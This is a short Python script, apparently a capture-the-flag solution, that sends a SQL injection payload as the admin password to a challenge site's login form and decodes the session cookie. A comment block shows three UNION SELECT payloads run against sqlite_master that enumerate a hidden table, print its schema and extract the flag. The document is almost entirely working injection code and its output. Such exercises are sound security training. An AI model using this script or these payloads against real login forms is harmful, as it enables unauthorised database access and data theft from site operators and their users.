#!/usr/bin/env python
import requests
import string
import base64
import string
import sys

url ='http://web1.ncc.ninja/aa801454ff4fe34/'
sql = sys.argv[1]

def login(url):
  payload={'username':'admin', 'password':sql}
  r = requests.post(url, data=payload)
  return r

r = login(url)
b64str = r.cookies['SESSION']
print base64.b64decode(b64str)

'''
$ python sqlite.py "' UNION SELECT tbl_name,null,null FROM sqlite_master-- -"

ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle:is_admin=False:2015-03-09 12:44:800f545306a9f90c2bfafc7092defc97

$ python sqlite.py "' UNION SELECT sql,null,null FROM sqlite_master-- -"

CREATE TABLE `ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle` (
	`flag`	TEXT
):is_admin=False:2015-03-09 12:44:2f4b26f2f202dcd309adda32d7a11817

$ python sqlite.py "' UNION SELECT flag,null,null FROM ThisTableNameIsReallyLongItWouldTakeAgesTo8873d1ed62e1d8c2deb337b77365afd2BruteForceTheNameSoIHopeYouUsedAScriptAtLeastTheAnnoyingThingIsProbablyTheRandomBitInTheMiddle-- -"
ca04e38f193095e3a14c4a4e62f11e1d30ee7d202d6efd66345385d3f60701b8:is_admin=False:2015-03-09 12:45:ee393cb32a21864337928d0233d20ad0

'''
